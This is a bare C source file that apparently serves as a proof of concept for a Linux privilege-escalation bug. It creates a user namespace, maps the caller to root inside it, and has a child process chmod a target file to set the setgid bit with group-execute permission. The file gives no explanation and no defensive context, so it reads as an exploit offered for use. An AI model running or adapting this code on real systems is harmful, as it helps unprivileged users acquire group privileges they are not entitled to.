#define _GNU_SOURCE
#include <sys/wait.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <string.h>
#include <assert.h>

#define STACK_SIZE (1024 * 1024)
static char child_stack[STACK_SIZE];

struct args {
    int pipe_fd[2];
    char *file_path;
};

static int child(void *arg) {
    struct args *f_args = (struct args *)arg;
    char c;

    close(f_args->pipe_fd[1]); 

    assert(read(f_args->pipe_fd[0], &c, 1) == 0);

    chmod(f_args->file_path, S_ISGID|S_IRUSR|S_IWUSR|S_IRGRP|S_IXGRP|S_IXUSR);

    return 0;
}

int main(int argc, char *argv[]) {
    int fd;
    pid_t pid;
    char mapping[1024];
    char map_file[PATH_MAX];
    struct args f_args;

    assert(argc == 2);

    f_args.file_path = argv[1];
    assert(pipe(f_args.pipe_fd) != -1);

    pid = clone(child, child_stack + STACK_SIZE, CLONE_NEWUSER | SIGCHLD, &f_args);
    assert(pid != -1);

    snprintf(mapping, 1024, "0 %d 1\n", getuid()); 

    snprintf(map_file, PATH_MAX, "/proc/%ld/uid_map", (long) pid);
    fd = open(map_file, O_RDWR); assert(fd != -1);

    assert(write(fd, mapping, strlen(mapping)) == strlen(mapping));
    close(f_args.pipe_fd[1]);

    assert (waitpid(pid, NULL, 0) != -1);
}
